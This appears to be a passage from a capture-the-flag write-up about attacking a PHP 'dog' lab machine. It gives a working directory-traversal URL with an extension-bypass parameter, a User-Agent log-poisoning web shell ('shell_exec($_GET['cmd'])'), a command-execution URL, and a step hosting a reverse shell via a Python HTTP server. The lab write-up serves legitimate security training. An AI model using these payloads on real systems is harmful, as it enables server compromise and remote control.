***Note
when we include a .php file we wont be able to see the actual PHP code since it runs on the server. 
A way around this is to use a handy PHP wrapper to base64 encode the file which we can decode later on.

{% endhighlight bash %}

{% endhighlight bash %}

## The following line is particularly interesting:
{% highlight bash %}
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
{% endhighlight bash %}
## There is an ‘ext’ parameter that specifies the file extention, if it is not set then it will be .php by default. 
## This explains why .php is appended to all file requests.
<br>
## To bypass this we just set the ‘ext’ parameter
## Add &ext= to bypass the .php filter being added
<br>
## We should have everything we need to bypass the filter now
## We know that the Apache web server by default has an access log.
## We can view this log at: 
{% highlight bash %}
/?view=/dog/../../../../../../../../../var/log/apache2/access.log&ext=
{% endhighlight bash %}
Notice how the User-Agent is being logged as well
we can intercept our request using Burp and replace the User-Agent variable in the header with PHP code. The following is the PHP code we will inject: 


Modify user agent to upload cmd command ability


modify:
GET /?view=/dog/../../../../../../../../../var/log/apache2/access.log&ext= HTTP/1.1

User-Agent:<?php echo shell_exec($_GET['cmd']) ?>


With this shell in the log file 
we can specify the ‘cmd’ parameter with a command we wish to execute. 
for example:
http://10.201.86.214/?view=/dog/../../../../../../../../../var/log/apache2/access.log&ext=&cmd=whoami


We can use the CMD command to curl(download) a reverse shell onto the target
We will use Python’s Simple HTTP Server to host our modified PHP reverse shell so that it can be downloaded onto the victim machine.

> python3 -m http.server 80
